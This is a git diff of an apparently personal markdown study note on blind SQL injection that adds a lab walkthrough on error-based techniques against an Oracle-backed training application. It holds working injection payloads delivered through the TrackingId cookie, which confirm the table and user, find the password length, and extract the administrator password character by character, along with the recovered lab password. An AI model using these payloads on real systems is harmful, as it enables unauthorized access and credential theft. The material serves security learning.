@@ -1,5 +1,5 @@
 ---
-title: 'Blind SQL Injection'
+title: "Blind SQL Injection"
 description: "Extract data from databases where query results aren't returned in the HTTP response."
 ---
 
@@ -60,9 +60,7 @@ Repeat for each character position until the full password is recovered.
   cheat sheet.
 </Warning>
 
-## Lab
-
-### Blind SQL Injection – Conditional Response (Administrator Password Extraction)
+### Lab: Conditional Response (Administrator Password Extraction)
 
 In this lab, I exploited a blind SQL injection vulnerability in the `TrackingId` cookie to extract the `administrator` password character by character.
 
@@ -70,7 +68,7 @@ The application returned a different response when the injected condition evalua
 
 ---
 
-### Working Payload
+#### Working Payload
 
 ```http
 GET / HTTP/2
@@ -98,7 +96,7 @@ I:
 
 ---
 
-### Mistake I Kept Making
+#### Mistake I Kept Making
 
 I got stuck multiple times because I forgot to append `--` at the end of the payload.
 
@@ -118,7 +116,7 @@ Correct pattern:
 
 ---
 
-### Extraction Method
+#### Extraction Method
 
 I used Burp Intruder to brute-force the password using prefix matching.
 
@@ -141,7 +139,7 @@ I increased the substring length from 1 up to 21.
 
 ---
 
-### Where It Stopped Working
+#### Where It Stopped Working
 
 When I tested length 21, I stopped getting matches.
 
@@ -154,7 +152,7 @@ This confirmed that the full password had been extracted.
 
 ---
 
-### Cleaner Alternative Approach
+#### Cleaner Alternative Approach
 
 Instead of matching growing prefixes, a more controlled method is testing one character at a time:
 
@@ -166,7 +164,7 @@ This avoids long prefix comparisons and reduces potential mistakes.
 
 ---
 
-### Key Takeaways
+#### Key Takeaways
 
 - Always terminate injections with `-- `.
 - A missing SQL comment can completely break blind SQLi.
@@ -175,3 +173,148 @@ This avoids long prefix comparisons and reduces potential mistakes.
 - Burp Intruder is effective for structured character-by-character extraction.
 
 ---
+
+## Error-Based Blind SQL Injection
+
+Sometimes a query runs, but the page looks the same whether your condition is
+true or false. In that case, normal boolean response checks do not help.
+
+The workaround is to make the database throw an error only when a condition is
+true. Then you infer truth from a response difference (500 error, different
+page length, missing content, etc.).
+
+### Two Common Outcomes
+
+- Conditional error channel: trigger an error only when your condition is true.
+- Verbose DB errors: in misconfigured apps, actual query data may leak directly
+  in error messages.
+
+### Conditional Error Pattern
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+- `1=2` path returns `'a'` and usually no DB error.
+- `1=1` path hits `1/0` (divide-by-zero), causing a DB error.
+
+If the HTTP response changes between these two payloads, you can use this as a
+true/false oracle.
+
+### Extracting Data With Conditional Errors
+
+```sql
+xyz' AND (
+  SELECT CASE
+    WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm')
+    THEN 1/0
+    ELSE 'a'
+  END
+  FROM Users
+)='a
+```
+
+If the request now errors, the condition is true. If it does not, the condition
+is false. Repeat this per character and position to recover the full value.
+
+### Lab: Conditional Errors (Oracle, Administrator Password)
+
+Vulnerable input: `TrackingId` cookie
+
+Goal:
+
+- Extract `administrator` password
+- Log in as `administrator`
+
+#### Step 1: Confirm Injection (Oracle)
+
+```sql
+' || (SELECT '' FROM dual) || '
+```
+
+If this is accepted, test a forced failure:
+
+```sql
+' || (SELECT '' FROM not_a_real_table) || '
+```
+
+If behavior changes, the parameter is injectable.
+
+#### Step 2: Confirm `users` Table
+
+```sql
+' || (SELECT '' FROM users WHERE ROWNUM = 1) || '
+```
+
+If this works, `users` exists.
+
+Why `ROWNUM = 1` matters:
+
+- A scalar subquery inside `|| (...) ||` must return exactly one row.
+- `(SELECT '' FROM users)` can return many rows -> Oracle throws
+  `ORA-01427: single-row subquery returns more than one row`.
+- `(SELECT '' FROM users WHERE ROWNUM = 1)` is capped to one row -> valid.
+
+#### Step 3: Confirm `administrator` Row
+
+```sql
+' || (
+  SELECT CASE
+    WHEN EXISTS (SELECT 1 FROM users WHERE username = 'administrator') THEN TO_CHAR(1/0)
+    ELSE ''
+  END
+  FROM dual
+) || '
+```
+
+- Error response (`500`) -> condition true
+- Normal response (`200`) -> condition false
+
+Why both payloads can still return `200` in blind SQLi:
+
+- `username='administrator'` and `username='fake_user'` checks can both be
+  syntactically valid and non-crashing.
+- `200` only means the query executed, not that your condition was true.
+- You need a conditional side effect (error or delay) to create a visible
+  true/false signal.
+
+#### Step 4: Find Password Length
+
+```sql
+' || (
+  SELECT CASE
+    WHEN EXISTS (
+      SELECT 1 FROM users
+      WHERE username = 'administrator' AND LENGTH(password) > 19
+    ) THEN TO_CHAR(1/0)
+    ELSE ''
+  END
+  FROM dual
+) || '
+```
+
+Adjust the number until you identify the exact length.
+
+#### Step 5: Extract Password Characters
+
+```sql
+' || (
+  SELECT CASE
+    WHEN EXISTS (
+      SELECT 1 FROM users
+      WHERE username = 'administrator' AND SUBSTR(password, 1, 1) = 'a'
+    ) THEN TO_CHAR(1/0)
+    ELSE ''
+  END
+  FROM dual
+) || '
+```
+
+Change position and candidate character until all characters are confirmed.
+
+Recovered password in this run:
+
+```text
+wjuc497wl6szhbtf0cbf
+```
